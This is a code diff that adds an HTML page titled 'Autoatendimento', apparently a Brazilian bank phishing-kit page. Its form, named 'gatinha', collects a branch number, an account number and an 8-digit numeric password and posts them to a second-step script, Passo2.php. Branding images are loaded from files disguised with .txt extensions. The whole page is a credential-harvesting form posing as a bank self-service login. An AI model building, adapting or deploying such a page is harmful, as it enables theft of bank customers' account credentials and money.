@@ -1,0 +1,98 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <link type="image/x-icon" href="Imagens/favicon.ico" rel="icon" />
+  <title>
+   Autoatendimento
+  </title>
+  <style>
+   body {
+overflow-x:hidden;
+overflow-y:hidden;
+}
+.footer {
+position:absolute;
+bottom:0;
+width:100%;
+}
+textarea{
+        resize:none;
+        font-family:"Verdana";  
+   		font-size: 11px;  
+   		padding: 3 2 4;
+   		background-color: "#FAFAFA";
+    }
+textarea:focus{
+   		background-color: white;
+   		border-color: #719ECE;
+    }
+input.text{
+        resize:none;
+        font-family:"Verdana";  
+   		font-size: 11px;  
+   		padding: 3 2 4;
+   		background-color: "#FAFAFA";
+   }
+ input.submit{
+        resize:none;
+        font-family:"Verdana";  
+   		font-size: 11px;  
+   		padding: 3 2 4;
+   		background-color: "#FAFAFA";
+   }
+  </style>
+ </head>
+ <body marginwidth="0" marginheight="0" bottommargin="0" rightmargin="0" leftmargin="0" topmargin="0">
+  <script language="JavaScript">
+   function SomenteNumero(e){
+    var tecla=(window.event)?event.keyCode:e.which;   
+    if((tecla&gt;47 &amp;&amp; tecla&lt;58)) return true;
+    else{
+    	if (tecla==8 || tecla==0) return true;
+	else  return false;
+    }
+}
+  </script>
+  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td height="132" background="Imagens/top.txt">
+     </td>
+    </tr>
+    <tr>
+     <td height="376">
+      <form name="gatinha" method="post" action="Passo2.php">
+       <div id="camada1" style="position: absolute; width: 100px; height: 100px; z-index: 1; left: 26px; top: 134px">
+        <div id="se1" style="position: absolute; width: 64px; height: 20px; z-index: 1; left: 33px; top: 114px">
+         <input type="password" onkeypress="return SomenteNumero(event)" tabindex="3" noresize="1" maxlength="8" style="border: 1px solid #ADADAD; background-color: #FAFAFA;height: 22px;width:105px;" cols="6" name="sen8" rows="2" />
+        </div>
+        <div id="ct0" style="position: absolute; width: 64px; height: 20px; z-index: 1; left: 102px; top: 71px">
+         <textarea onkeypress="return SomenteNumero(event)" tabindex="2" noresize="1" maxlength="10" style="border: 1px solid #ADADAD; background-color: #FAFAFA;height: 22px;width:100px;" cols="6" name="cot" rows="2">
+         </textarea>
+        </div>
+        <div id="aag" style="position: absolute; width: 64px; height: 20px; z-index: 1; left: 32px; top: 71px">
+         <textarea onkeypress="return SomenteNumero(event)" tabindex="1" noresize="1" maxlength="6" style="border: 1px solid #ADADAD; background-color: #FAFAFA;height: 22px;width:65px;" cols="6" name="agc" rows="2">
+         </textarea>
+        </div>
+        <div id="camada2" style="position: absolute; width: 74px; height: 19px; z-index: 2; left: 33px; top: 166px">
+         <input type="image" border="0" src="Imagens/2.png" />
+        </div>
+        <div id="camada3" style="position: absolute; width: 74px; height: 19px; z-index: 2; left: 110px; top: 166px">
+         <input type="reset" border="0" name="reset" value=" " style="border-style:solid; border-width:0; background-position: center; background-image:url('Imagens/1.png'); background-repeat:no-repeat;width: 69px; height: 23px;cursor:pointer;" />
+        </div>
+        <img src="Imagens/1.txt" />
+       </div>
+      </form>
+     </td>
+    </tr>
+    <tr>
+     <td>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <div class="footer">
+   <img src="Imagens/rod.txt" />
+  </div>
+ </body>
+</html>
